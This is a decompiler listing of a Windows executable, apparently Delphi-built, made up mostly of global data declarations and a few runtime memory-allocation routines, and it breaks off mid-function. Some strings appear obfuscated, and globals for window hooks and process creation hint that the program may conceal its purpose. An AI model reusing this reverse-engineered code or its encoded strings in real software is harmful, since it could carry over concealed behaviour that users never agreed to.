_UNKNOWN loc_4237EA; // weak
_UNKNOWN loc_4237F1; // weak
_UNKNOWN loc_4238E9; // weak
_UNKNOWN loc_4238F0; // weak
_UNKNOWN loc_42393C; // weak
_UNKNOWN locret_423943; // weak
_UNKNOWN loc_423944; // weak
_UNKNOWN sub_423955; // weak
_UNKNOWN loc_423AA5; // weak
_UNKNOWN loc_423AAC; // weak
_UNKNOWN loc_423B8A; // weak
_UNKNOWN locret_423B91; // weak
_UNKNOWN loc_423B92; // weak
_UNKNOWN loc_423EF8; // weak
_UNKNOWN loc_423EFF; // weak
_UNKNOWN loc_423F2C; // weak
_UNKNOWN loc_424035; // weak
_UNKNOWN loc_42403C; // weak
int dword_42404C = 92; // weak
int dword_424068[3] = { 7171374, -1, 5 }; // weak
int dword_4240A4[3] = { 2764330, -1, 1 }; // weak
int dword_4240B0[3] = { 46, -1, 2 }; // weak
int dword_4240BC = 11822; // weak
_UNKNOWN loc_4241CE; // weak
_UNKNOWN loc_4241D5; // weak
_UNKNOWN loc_4241F0; // weak
_UNKNOWN loc_4241F7; // weak
const CHAR Buffer[4] = { '\0', '\0', '\0', '\0' }; // idb
_UNKNOWN loc_42425B; // weak
int dword_424270[3] = { 825098769, 8, 0 }; // weak
_UNKNOWN loc_424728; // weak
_UNKNOWN loc_42472F; // weak
int dword_424778[3] = { 12336, -1, 4 }; // weak
_UNKNOWN loc_424C02; // weak
_UNKNOWN loc_424C09; // weak
int dword_424C98 = 49; // weak
_UNKNOWN loc_424D59; // weak
_UNKNOWN loc_424D60; // weak
int dword_424D70[3] = { 48, -1, 4 }; // weak
int dword_424D7C[2] = { -1077222194, 0 }; // weak
int dword_424D8C[3] = { 49, -1, 6 }; // weak
int dword_424D98[4] = { -1464358972, 42698, -1, 1 }; // weak
int dword_424DA8[3] = { 50, -1, 4 }; // weak
int dword_424DC4[3] = { 53444, -1, 2 }; // weak
int dword_424DD0 = 44741; // weak
_UNKNOWN loc_425400; // weak
_UNKNOWN loc_425407; // weak
const CHAR dword_425440[] = { '\xC7', '\xF8', '\xD3', '\xF2', '\0', '\0', '\0', '\0' }; // idb
int dword_425474 = 42; // weak
_UNKNOWN loc_4255DF; // weak
_UNKNOWN loc_426224; // weak
_UNKNOWN loc_42622B; // weak
int dword_42626C = 49; // weak
int dword_426298[4] = { -21511470, 58, -1, 4 }; // weak
int dword_4262BC[2] = { -137960242, 58 }; // weak
int dword_4262C4[3] = { 3367546, -1, 5 }; // weak
int dword_4262D0[2] = { -1262358833, 58 }; // weak
int dword_4262D8[3] = { 3433082, -1, 7 }; // weak
int dword_4262E4[2] = { -691350829, 3861999 }; // weak
int dword_4262EC[3] = { 3498618, -1, 7 }; // weak
int dword_4262F8[2] = { -691342377, 3861999 }; // weak
int dword_426300[3] = { 3564154, -1, 7 }; // weak
int dword_42630C[2] = { -457321773, 3848406 }; // weak
int dword_426314[3] = { 3629690, -1, 7 }; // weak
int dword_426320[2] = { -457313321, 3848406 }; // weak
int dword_426340[2] = { -220989241, 0 }; // weak
_UNKNOWN loc_426992; // weak
_UNKNOWN loc_426999; // weak
int dword_4269C4 = 49; // weak
int dword_4269C8[3] = { 17481, -1, 4 }; // weak
_UNKNOWN loc_426B0E; // weak
_UNKNOWN loc_426B15; // weak
_UNKNOWN loc_426C36; // weak
_UNKNOWN loc_426C3D; // weak
_UNKNOWN loc_426DAB; // weak
_UNKNOWN loc_426DB2; // weak
int dword_426DE8 = 20563; // weak
_UNKNOWN loc_4273D7; // weak
_UNKNOWN loc_427C87; // weak
_UNKNOWN loc_427C8E; // weak
int dword_427CB8 = 49; // weak
int dword_427CEC = 47; // weak
int dword_427D2C[2] = { -220989241, 0 }; // weak
int dword_427D60[3] = { 48801, -1, 1 }; // weak
int dword_427D6C[3] = { 44, -1, 2 }; // weak
int dword_427D7C = 20563; // weak
int dword_427DC0[2] = { -709764935, 48801 }; // weak
int dword_427DF0[3] = { 17746, -1, 2 }; // weak
int dword_427DFC[3] = { 20558, -1, 2 }; // weak
int dword_427E08[3] = { 20559, -1, 2 }; // weak
int dword_427E14[3] = { 17481, -1, 31 }; // weak
int dword_427E60[3] = { 19781, -1, 2 }; // weak
int dword_427E6C[3] = { 20045, -1, 2 }; // weak
int dword_427E78[3] = { 21838, -1, 2 }; // weak
int dword_427E84[3] = { 12865, -1, 2 }; // weak
int dword_427E90[3] = { 12881, -1, 2 }; // weak
int dword_427E9C[3] = { 12609, -1, 2 }; // weak
int dword_427EA8[3] = { 12625, -1, 2 }; // weak
int dword_427EB4[3] = { 18754, -1, 2 }; // weak
int dword_427EC0[3] = { 16718, -1, 2 }; // weak
int dword_427ECC[3] = { 22352, -1, 24 }; // weak
_UNKNOWN loc_4280D2; // weak
_UNKNOWN loc_4280D9; // weak
int dword_428100 = 49; // weak
_UNKNOWN loc_428CF3; // weak
_UNKNOWN loc_429541; // weak
_UNKNOWN loc_429548; // weak
const BYTE dword_429570 = 0u; // idb
int dword_4295F4[3] = { 49, -1, 1 }; // weak
int dword_429600[3] = { 48, -1, 6 }; // weak
const CHAR dword_4296B0[] = { '\xC7', '\xF8', '\xD3', '\xF2', '\0', '\0', '\0', '\0' }; // idb
const CHAR dword_4296B8[] = { 'S', 'P', '\0', '\0' }; // idb
int dword_429748 = 16986; // weak
_UNKNOWN loc_429849; // weak
_UNKNOWN loc_429850; // weak
_UNKNOWN loc_42A200; // weak
_UNKNOWN loc_42A207; // weak
int dword_42A218[3] = { 3485235, -1, 4 }; // weak
int dword_42A258[3] = { 64, -1, 16 }; // weak
_UNKNOWN loc_42A468; // weak
int dword_42A474 = 29; // weak
_UNKNOWN loc_42AAE5; // weak
_UNKNOWN loc_42AAEC; // weak
int dword_42ABDC[64] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
const BYTE dword_42ACF8 = 0u; // idb
int dword_42B000 = 0; // weak
int dword_42B004 = 0; // weak
char byte_42B008 = '\x02'; // weak
__int16 word_42B00C = 4914; // weak
char byte_42B014 = '\0'; // weak
char byte_42B018 = '\0'; // weak
char byte_42B01C = '\0'; // weak
char byte_42B020 = '\x01'; // weak
int dword_42B024 = 0; // weak
int dword_42B028 = 0; // weak
int (__cdecl *off_42B02C)(_DWORD) = &sub_402118; // weak
int (*off_42B030)(void) = &sub_4022A8; // weak
int (__cdecl *off_42B034)(_DWORD) = &sub_40261C; // weak
char byte_42B038[28] =
{
  '\0',
  '\xCB',
  '\xCC',
  '\xC8',
  '\xC9',
  '\xD7',
  '\xCF',
  '\xC8',
  '\xCD',
  '\xCE',
  '\xDB',
  '\xD8',
  '\xCA',
  '\xD9',
  '\xDA',
  '\xDC',
  '\xDD',
  '\xDE',
  '\xDF',
  '\xE0',
  '\xE1',
  '\xE3',
  '\0',
  '\xE4',
  '\xE5',
  '\x8D',
  '@',
  '\0'
}; // weak
CHAR Text[] = "Runtime error     at 00000000"; // idb
CHAR Caption[] = "Error"; // idb
char byte_42B07C[] = { '0' }; // weak
char a123456789abcde[16] = "123456789ABCDEF"; // weak
int dword_42B090 = 0; // weak
int dword_42B094 = 0; // weak
int dword_42B098 = 0; // weak
_DWORD dword_42B0A4 = 0; // weak
OLECHAR *dword_42B0A8 = NULL; // weak
int dword_42B0AC = 0; // weak
int dword_42B0B0 = 0; // weak
int dword_42B0B4 = 0; // weak
int dword_42B0B8 = 0; // weak
_DWORD dword_42B0BC = 0; // weak
int dword_42B0C0 = 0; // weak
int *off_42B0E0 = &dword_407884; // weak
int dword_42B0E4 = 0; // weak
int (*off_42B0E8)[4] = &dword_407CC8; // weak
DWORD dwDesiredAccess[3] = { 2147483648u, 1073741824u, 3221225472u }; // weak
DWORD dwShareMode[5] = { 0u, 0u, 1u, 2u, 3u }; // weak
_TBYTE tbyte_42B118 = 1.0e18; // weak
int dword_42B124 = 10; // weak
int **off_42B128[38] =
{
  &off_406CA4,
  &off_406CAC,
  &off_406CB4,
  &off_406CBC,
  &off_406CC4,
  &off_406CCC,
  &off_406CD4,
  &off_406CDC,
  &off_406CE4,
  &off_406CEC,
  &off_406CF4,
  &off_406CFC,
  &off_406D04,
  &off_406D0C,
  &off_406D14,
  &off_406D1C,
  &off_406D24,
  &off_406D2C,
  &off_406D34,
  &off_406D3C,
  &off_406D44,
  &off_406D4C,
  &off_406D54,
  &off_406D5C,
  &off_406D64,
  &off_406D6C,
  &off_406D74,
  &off_406D7C,
  &off_406D84,
  &off_406D8C,
  &off_406D94,
  &off_406D9C,
  &off_406DA4,
  &off_406DAC,
  &off_406DB4,
  &off_406DBC,
  &off_406DC4,
  &off_406DCC
}; // weak
int **off_42B158[26] =
{
  &off_406D04,
  &off_406D0C,
  &off_406D14,
  &off_406D1C,
  &off_406D24,
  &off_406D2C,
  &off_406D34,
  &off_406D3C,
  &off_406D44,
  &off_406D4C,
  &off_406D54,
  &off_406D5C,
  &off_406D64,
  &off_406D6C,
  &off_406D74,
  &off_406D7C,
  &off_406D84,
  &off_406D8C,
  &off_406D94,
  &off_406D9C,
  &off_406DA4,
  &off_406DAC,
  &off_406DB4,
  &off_406DBC,
  &off_406DC4,
  &off_406DCC
}; // weak
int **off_42B188[14] =
{
  &off_406D64,
  &off_406D6C,
  &off_406D74,
  &off_406D7C,
  &off_406D84,
  &off_406D8C,
  &off_406D94,
  &off_406D9C,
  &off_406DA4,
  &off_406DAC,
  &off_406DB4,
  &off_406DBC,
  &off_406DC4,
  &off_406DCC
}; // weak
int **off_42B1A4[7] =
{
  &off_406D9C,
  &off_406DA4,
  &off_406DAC,
  &off_406DB4,
  &off_406DBC,
  &off_406DC4,
  &off_406DCC
}; // weak
int dword_42B1C0[] = { 2 }; // weak
int dword_42B1C4[] = { 0 }; // weak
int dword_42B1E0[] = { 100 }; // weak
int (*off_42B1F8)[3] = &dword_407110; // weak
int dword_42B2A8 = 542711489; // weak
_DWORD *dword_42B2AC = NULL; // weak
char *off_42B2B0[2] = { "jtmi7(/*7zvt", "jtmi7(/*7zvt" }; // weak
char *off_42B2BC[2] = { "|xj|w|mcqsY(/*7zvt", "nq`wvmj|w}txpuY(/*7zvt" }; // weak
char *off_42B2C8 = "nnnF( (+ Fzvt"; // weak
char *off_42B2D4 = "ch  /ac !wiv)v"; // weak
char *off_42B2E0[2] = { "CN_cCN,u}Qivx~$$", "}+q,{t )z+OlC^(qxNn$" }; // weak
char *off_42B2EC = "cV.HmUs+`ToA`jQI"; // weak
DWORD dword_42B2F8[3] = { 2147483648u, 1073741824u, 3221225472u }; // weak
DWORD dword_42B304[5] = { 0u, 0u, 1u, 2u, 3u }; // weak
int dword_42B318[] = { 0 }; // weak
char byte_42B428[21] =
{
  '\0',
  '\x01',
  '\x02',
  '\x02',
  '\x03',
  '\x03',
  '\x04',
  '\a',
  '\x05',
  '\0',
  '\0',
  '\x06',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x02',
  '\x02',
  '\b',
  '\b',
  '\b'
}; // weak
_BYTE byte_42B440[84] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  0,
  1,
  2,
  3,
  4,
  3,
  2,
  7,
  8,
  0,
  1,
  3,
  3,
  4,
  3,
  3,
  7,
  3,
  0,
  1,
  4,
  4,
  4,
  4,
  4,
  7,
  4,
  0,
  1,
  3,
  3,
  4,
  5,
  6,
  7,
  3,
  0,
  1,
  2,
  3,
  4,
  6,
  6,
  7,
  8,
  0,
  1,
  7,
  7,
  7,
  7,
  7,
  7,
  7,
  0,
  1,
  8,
  3,
  4,
  3,
  8,
  7,
  8,
  -115,
  64,
  0
}; // weak
int dword_42B494 = -1; // weak
_BYTE byte_42B498[12] = { 0, 1, 1, 0, 1, 0, 2, 0, 1, 2, 0, 2 }; // weak
_BYTE byte_42B4A4[20] = { 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, -117, -64 }; // weak
char *off_42B4B8[2] = { "False", "True" }; // weak
char *off_42B4BC = "True"; // weak
int *off_42B4C0 = &dword_4163B8; // weak
char aTpf0[5] = "TPF0"; // weak
_DWORD *dword_42B4FC = NULL; // weak
int (*off_42B500)[4] = &dword_4203AC; // weak
int (*off_42B508)[4] = &dword_420414; // weak
int dword_42B514 = 0; // weak
char byte_42B51A = '\x01'; // weak
_DWORD aMsSansSerif[8] = { 542330125, 1936613715, 1919243040, 26217, 0, 0, 0, 0 }; // weak
int dword_42B53C = 0; // weak
int dword_42B6C4 = 0; // weak
__int16 word_42B754[8] = { 0, 1, 2, 3, 4, 5, 6, -16245 }; // weak
__int16 word_42B764[16] = { 1, 16, 11, 6, 13, 4, 14, 5, 12, 3, 15, 2, 9, 8, 7, 10 }; // weak
int dword_42B784 = 0; // weak
int dword_42B788 = 0; // weak
int dword_42B78C = 0; // weak
char byte_42B790[64] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\0',
  '\0',
  '',
  '',
  '\0',
  '\0',
  '\0',
  '\0',
  '',
  '\0',
  '',
  '\0',
  '',
  '\0',
  '\0',
  '',
  '',
  '\0',
  '',
  '',
  '',
  '\0',
  '\xC0',
  '\xC0',
  '\xC0',
  '\0',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '\0',
  '\xFF',
  '\0',
  '\xFF',
  '\0',
  '\xFF',
  '\0',
  '\0',
  '\xFF',
  '\xFF',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0'
}; // weak
char *off_42B7D0 = "1180000"; // weak
char *off_42B7E4 = "2FEE000"; // weak
void *off_42B7F8 = &loc_424334; // weak
char *off_42B7FC[5] =
{
  "233C3C3C3C3C3D403E3C3C3C3C3C3C3C3C21",
  "160000000200000007000000",
  "23313C3C3C3C3C4940433C3C3C3C3C3C3C3C",
  "23323C3C3C3C3C4940433C3C3C3C3C3C3C3C",
  "3C3C3C3C3C3D403E3C3C3C3C3C3C3C3C30"
}; // weak
int *off_42B82C = &dword_42CC60; // weak
int *off_42B834 = &dword_42C028; // weak
char **off_42B838 = &off_42B2E0; // weak
int **off_42B83C[2] = { &off_406C5C, &off_406DC4 }; // weak
int *off_42B844 = &dword_42C008; // weak
int **off_42B850 = &off_4204CC; // weak
int *off_42B854[2] = { &dword_42C900, &dword_42C908 }; // weak
int *off_42B858 = &dword_42C908; // weak
int *off_42B860[3] = { &dword_42CA08, &dword_42C9F4, &dword_42C9F8 }; // weak
int *off_42B864[2] = { &dword_42C9F4, &dword_42C9F8 }; // weak
int *off_42B868 = &dword_42C9F8; // weak
int *off_42B87C = &dword_42CA10; // weak
void *off_42B880 = &unk_42C01C; // weak
int **off_42B884 = &off_406B54; // weak
int (*off_42B888)[18] = &dword_42C970; // weak
int **off_42B88C[7] =
{
  &off_406C04,
  &off_406B4C,
  &off_406CE4,
  &off_406B8C,
  &off_406C0C,
  &off_406C84,
  &off_4162D0
}; // weak
int **off_42B890[6] = { &off_406B4C, &off_406CE4, &off_406B8C, &off_406C0C, &off_406C84, &off_4162D0 }; // weak
int **off_42B8A4 = &off_4162D0; // weak
int *off_42B8A8 = &dword_42C910; // weak
char **off_42B8B4 = &off_42B2BC; // weak
void *off_42B8B8 = &unk_42C214; // weak
int *off_42B8C8 = &dword_42C00C; // weak
LPPROCESS_INFORMATION lpProcessInformation = &ProcessInformation; // idb
int **off_42B8D4[2] = { &off_4162A8, &off_406D14 }; // weak
int *off_42B8DC[2] = { &dword_42C004, &dword_42C8FC }; // weak
int *off_42B8E0[3] = { &dword_42C8FC, &dword_42C9D0, &dword_42C010 }; // weak
int *off_42B8E4[2] = { &dword_42C9D0, &dword_42C010 }; // weak
int *off_42B8E8 = &dword_42C010; // weak
int **off_42B8F0[7] =
{
  &off_42B4C0,
  &off_406B44,
  &off_406D5C,
  &off_406BE4,
  &off_406BEC,
  &off_406D94,
  &off_406B5C
}; // weak
int *off_42B90C = &dword_42CCD0; // weak
char **off_42B914 = &off_42B2D4; // weak
int **off_42B91C[2] = { &off_4162C0, &off_406C44 }; // weak
int *off_42B924 = &dword_42C9EC; // weak
int *off_42B92C = &dword_42C9FC; // weak
int **off_42B930[3] = { &off_416340, &off_416308, &off_406C6C }; // weak
int **off_42B934[2] = { &off_416308, &off_406C6C }; // weak
int *off_42B93C = &dword_42CCDC; // weak
int **off_42B940[3] = { &off_4162B0, &off_406D2C, &off_406C24 }; // weak
int *off_42B94C = &dword_42CA00; // weak
int **off_42B950[3] = { &off_4162E8, &off_406D1C, &off_406D3C }; // weak
int *off_42B95C = &dword_42CA04; // weak
char *off_42B960 = &byte_42CCD8; // weak
int **off_42B964[2] = { &off_416350, &off_406C1C }; // weak
int *off_42B96C = &dword_42C90C; // weak
int **off_42B97C[2] = { &off_416300, &off_406B7C }; // weak
int *off_42B984 = &dword_42CCD4; // weak
int *off_42B990 = &dword_42CC64; // weak
char **off_42B994 = &off_42B2EC; // weak
int **off_42B998[5] = { &off_4162C8, &off_406BCC, &off_406D8C, &off_406BC4, &off_4162F8 }; // weak
int **off_42B99C[4] = { &off_406BCC, &off_406D8C, &off_406BC4, &off_4162F8 }; // weak
int *off_42B9AC = &dword_42C9B8; // weak
void *off_42B9B4 = &unk_42C020; // weak
int **off_42B9BC = &off_406C3C; // weak
LPSTARTUPINFOA lpStartupInfo = &StartupInfo; // idb
int **off_42B9C8 = &off_406C94; // weak
void *off_42B9CC = &unk_42B320; // weak
int **off_42B9D4 = &off_406C64; // weak
int *off_42B9D8 = &dword_42C904; // weak
char *off_42B9E8 = &byte_42C044; // weak
int (*off_42B9F4)[18] = &dword_42C928; // weak
int *off_42B9F8 = &dword_42C9F0; // weak
int **off_42B9FC[3] = { &off_416310, &off_406C8C, &off_4162D8 }; // weak
int **off_42BA00[2] = { &off_406C8C, &off_4162D8 }; // weak
int **off_42BA04 = &off_4162D8; // weak
void *off_42BA08 = &unk_42C9C0; // weak
void *off_42BA0C = &unk_42C9C4; // weak
int **off_42BA14[5] = { &off_4162E0, &off_406CD4, &off_406C7C, &off_406CF4, &off_4162F0 }; // weak
int **off_42BA1C[3] = { &off_406C7C, &off_406CF4, &off_4162F0 }; // weak
void *off_42BA28 = &unk_42C9BC; // weak
int **off_42BA30[3] = { &off_4162B8, &off_406CB4, &off_406BDC }; // weak
int **off_42BA38 = &off_406BDC; // weak
char **off_42BA3C = &off_42B2C8; // weak
void *off_42BA40 = &unk_42C9E8; // weak
int **off_42BA44[8] =
{
  &off_416328,
  &off_406B64,
  &off_406BF4,
  &off_416320,
  &off_406B9C,
  &off_406B94,
  &off_406CFC,
  &off_42B0E0
}; // weak
int **off_42BA50[5] = { &off_416320, &off_406B9C, &off_406B94, &off_406CFC, &off_42B0E0 }; // weak
int **off_42BA54[4] = { &off_406B9C, &off_406B94, &off_406CFC, &off_42B0E0 }; // weak
int **off_42BA60 = &off_42B0E0; // weak
char **off_42BA64 = &off_42B2B0; // weak
int **off_42BA68[4] = { &off_406C9C, &off_416318, &off_406BAC, &off_416338 }; // weak
int **off_42BA74 = &off_416338; // weak
char *off_42BA78 = &byte_42CA20; // weak
void *off_42BA80 = &unk_42C9C8; // weak
void *off_42BA84 = &unk_42C9CC; // weak
int **off_42BA88[3] = { &off_406BFC, &off_406BD4, &off_406BB4 }; // weak
int *off_42BA94 = &Locale; // weak
int **off_42BA98[2] = { &off_406C34, &off_406CCC }; // weak
int dword_42C000; // weak
int (__fastcall *dword_42C008)(_DWORD, _DWORD); // weak
int (*dword_42C010)(void); // weak
int (__stdcall *dword_42C014)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_42C018)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (*dword_42C024)(void); // weak
int (*dword_42C028)(void); // weak
int dword_42C02C; // weak
int dword_42C030; // weak
char byte_42C034; // weak
int dword_42C038; // weak
int dword_42C03C; // weak
_UNKNOWN unk_42C040; // weak
char byte_42C044; // weak
char byte_42C045; // weak
char byte_42C046; // weak
_UNKNOWN unk_42C048; // weak
__int16 word_42C04C; // weak
_UNKNOWN unk_42C214; // weak
__int16 word_42C218; // weak
int dword_42C220; // weak
int (*dword_42C230)(void); // weak
_UNKNOWN unk_42C3E0; // weak
__int16 word_42C3E4; // weak
int dword_42C5AC; // weak
int dword_42C5B0; // weak
int dword_42C5B4; // weak
char byte_42C5B8; // weak
int dword_42C5BC; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
HLOCAL dword_42C5D8; // idb
int dword_42C5DC; // weak
int dword_42C5E0; // weak
_DWORD dword_42C5F0[4]; // weak
_UNKNOWN unk_42C600; // weak
int dword_42C604; // weak
int dword_42C60C; // weak
int dword_42C610; // weak
int dword_42C614; // weak
HLOCAL hMem; // idb
int dword_42C61C[4]; // weak
const void *dword_42C62C; // weak
int dword_42C630; // weak
int dword_42C634; // weak
int dword_42C638; // weak
int dword_42C63C; // weak
int dword_42C658[]; // weak
int (__stdcall *dword_42C69C)(_DWORD, _DWORD); // weak
int (__thiscall *dword_42C6DC)(_DWORD); // weak
char byte_42C704; // weak
char byte_42C705; // weak
DWORD TlsIndex; // idb
HINSTANCE hmod; // idb
int dword_42C714; // weak
int dword_42C718; // weak
int dword_42C71C; // weak
int dword_42C720; // weak
int dword_42C724; // weak
int dword_42C728; // weak
char byte_42C72C; // weak
char byte_42C72D; // weak
char byte_42C72E; // weak
char byte_42C72F; // weak
char byte_42C730; // weak
char byte_42C731; // weak
_DWORD dword_42C734; // weak
_DWORD dword_42C738; // weak
char byte_42C73C; // weak
_DWORD dword_42C740; // weak
_DWORD dword_42C744; // weak
_DWORD dword_42C748; // weak
_DWORD dword_42C74C; // weak
int dword_42C750[12]; // weak
int dword_42C780[12]; // weak
int dword_42C7B0[7]; // weak
int dword_42C7CC[7]; // weak
LCID Locale; // idb
int dword_42C7EC; // weak
int dword_42C7F0; // weak
int dword_42C7F4[]; // weak
int dword_42C7F8[6]; // weak
int dword_42C810[]; // weak
_UNKNOWN unk_42C814; // weak
int dword_42C830; // weak
int dword_42C834; // weak
int dword_42C838; // weak
int dword_42C83C; // weak
int dword_42C840; // weak
_DWORD *dword_42C844; // weak
int dword_42C848; // weak
HMODULE dword_42C84C; // weak
int (__stdcall *dword_42C850)(_DWORD, _DWORD); // weak
int dword_42C854; // weak
int dword_42C858; // weak
int dword_42C85C; // weak
int dword_42C860; // weak
int dword_42C864; // weak
int (__stdcall *dword_42C868)(_DWORD, _DWORD); // weak
int (__stdcall *dword_42C86C)(_DWORD, _DWORD); // weak
int dword_42C870; // weak
int dword_42C874; // weak
int dword_42C878; // weak
int dword_42C87C; // weak
int dword_42C880; // weak
int dword_42C884; // weak
int dword_42C888; // weak
int dword_42C88C; // weak
int dword_42C890; // weak
HMODULE dword_42C894; // weak
int (__stdcall *dword_42C898)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_42C89C)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_42C8A0)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_42C8A4)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_42C8A8; // weak
int dword_42C8AC; // weak
int dword_42C8B0; // weak
int dword_42C8B4; // weak
int (__stdcall *dword_42C8B8)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_42C8BC; // weak
int dword_42C8C0; // weak
int dword_42C8C4; // weak
int dword_42C8C8; // weak
int dword_42C8CC; // weak
int dword_42C8D0; // weak
int dword_42C8D4; // weak
int dword_42C8D8; // weak
int dword_42C8DC; // weak
int dword_42C8E0; // weak
int dword_42C8E4; // weak
int dword_42C8E8; // weak
int dword_42C8EC; // weak
int dword_42C8F0; // weak
int dword_42C8F4; // weak
int dword_42C8F8; // weak
int dword_42C8FC; // weak
int dword_42C900; // weak
int dword_42C904; // weak
int dword_42C908; // weak
int dword_42C90C; // weak
int dword_42C910; // weak
HMODULE hLibModule; // idb
int dword_42C918[]; // weak
int dword_42C91C[3]; // weak
int dword_42C928[18]; // weak
int dword_42C970[18]; // weak
_DWORD dword_42C9B8; // weak
__int32 dword_42C9D0; // weak
__int32 dword_42C9D4; // weak
__int32 dword_42C9D8; // weak
char byte_42C9DC; // weak
char byte_42C9E0; // weak
int dword_42C9E4; // weak
_DWORD dword_42C9EC; // weak
_DWORD dword_42C9F0; // weak
_DWORD dword_42C9F4; // weak
_DWORD dword_42C9F8; // weak
_DWORD dword_42C9FC; // weak
_DWORD dword_42CA00; // weak
_DWORD dword_42CA04; // weak
_DWORD dword_42CA08; // weak
_DWORD dword_42CA0C; // weak
int dword_42CA10; // weak
int dword_42CA14; // weak
int dword_42CA18; // weak
int dword_42CA1C; // weak
char byte_42CA20; // weak
int dword_42CA24; // weak
int dword_42CA28; // weak
int dword_42CA2C; // weak
_UNKNOWN unk_42CA30; // weak
int (__cdecl *dword_42CA40)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (*dword_42CA44)(void); // weak
int (__stdcall *dword_42CA48)(_DWORD); // weak
int (*dword_42CA4C)(void); // weak
int dword_42CA50; // weak
_DWORD dword_42CA54[43]; // weak
int dword_42CB00[43]; // weak
int dword_42CBAC; // weak
int dword_42CBB0; // weak
int dword_42CBB4; // weak
int dword_42CBB8; // weak
int dword_42CBBC; // weak
int dword_42CBC0; // weak
int dword_42CBC4; // weak
int dword_42CBC8; // weak
int dword_42CBCC; // weak
int dword_42CBD0; // weak
int dword_42CBD4; // weak
struct _RTL_CRITICAL_SECTION stru_42CBD8; // idb
int dword_42CBF0; // weak
int dword_42CBF4; // weak
int dword_42CBF8; // weak
int dword_42CBFC; // weak
HGDIOBJ ho; // idb
int dword_42CC04; // weak
int nNumerator; // idb
HGDIOBJ h; // idb
HGDIOBJ dword_42CC10; // idb
HGDIOBJ dword_42CC14; // idb
int dword_42CC18; // weak
struct _RTL_CRITICAL_SECTION stru_42CC1C; // idb
struct _RTL_CRITICAL_SECTION stru_42CC34; // idb
int dword_42CC4C; // weak
int dword_42CC50; // weak
int dword_42CC54; // weak
int dword_42CC58; // weak
int dword_42CC5C; // weak
int dword_42CC60; // weak
_DWORD dword_42CC64; // weak
struct _STARTUPINFOA StartupInfo; // idb
struct _PROCESS_INFORMATION ProcessInformation; // idb
_UNKNOWN unk_42CCBC; // weak
int dword_42CCCC; // weak
int dword_42CCD0; // weak
int dword_42CCD4; // weak
char byte_42CCD8; // weak
int dword_42CCDC; // weak
int dword_42CCE0; // weak
int dword_42CCE4; // weak
WNDCLASSA WndClass; // idb
HINSTANCE hInstance; // idb
HWND hWnd; // idb
HHOOK hhk; // idb
HHOOK dword_42CD1C; // idb
MSG Msg; // idb
BYTE ExistingFileName; // idb
BYTE byte_42CE3C; // idb
int dword_42E13C; // weak
int dword_42E140; // weak
char byte_42E144; // weak
int dword_42E148; // weak
int dword_42E14C; // weak
int dword_42E150; // weak
int dword_42E154; // weak
int dword_42E158; // weak
char byte_42E15C; // weak


//----- (0040133C) --------------------------------------------------------
int sub_40133C()
{
  int v0; // ebx
  struct _STARTUPINFOA v2; // [esp+0h] [ebp-48h] BYREF

  v0 = 10;
  GetStartupInfoA(&v2);
  if ( (v2.dwFlags & 1) != 0 )
    return v2.wShowWindow;
  return v0;
}

//----- (004013A0) --------------------------------------------------------
int sub_4013A0()
{
  _DWORD *v0; // ecx
  int result; // eax
  int i; // edx

  if ( !dword_42C5DC )
  {
    v0 = LocalAlloc(0, 0x644u);
    if ( !v0 )
      return 0;
    *v0 = dword_42C5D8;
    dword_42C5D8 = v0;
    for ( i = 0; i != 100; ++i )
    {
      v0[4 * i + 1] = dword_42C5DC;
      dword_42C5DC = (int)&v0[4 * i + 1];
    }
  }
  result = dword_42C5DC;
  dword_42C5DC = *(_DWORD *)dword_42C5DC;
  return result;
}
// 42C5DC: using guessed type int dword_42C5DC;

//----- (004013F0) --------------------------------------------------------
_DWORD *__usercall sub_4013F0@<eax>(_DWORD *result@<eax>)
{
  *result = result;
  result[1] = result;
  return result;
}

//----- (004013F8) --------------------------------------------------------
char __usercall sub_4013F8@<al>(int *a1@<eax>, int *a2@<edx>)
{
  int *v4; // eax
  int v6; // edx

  v4 = (int *)sub_4013A0();
  if ( !v4 )
    return 0;
  v4[2] = *a2;
  v4[3] = a2[1];
  v6 = *a1;
  *v4 = *a1;
  v4[1] = (int)a1;
  *(_DWORD *)(v6 + 4) = v4;
  *a1 = (int)v4;
  return 1;
}

//----- (00401428) --------------------------------------------------------
int *__usercall sub_401428@<eax>(int *result@<eax>)
{
  int *v1; // edx
  int v2; // ecx

  v1 = (int *)result[1];
  v2 = *result;
  *v1 = *result;
  *(_DWORD *)(v2 + 4) = v1;
  *result = dword_42C5DC;
  dword_42C5DC = (int)result;
  return result;
}
// 42C5DC: using guessed type int dword_42C5DC;

//----- (00401440) --------------------------------------------------------
char __usercall sub_401440@<al>(int *a1@<eax>, int *a2@<edx>, int *a3@<ecx>)
{
  int *v5; // ebx
  int v6; // edi
  char result; // al

  v5 = (int *)*a1;
  *a3 = *a2;
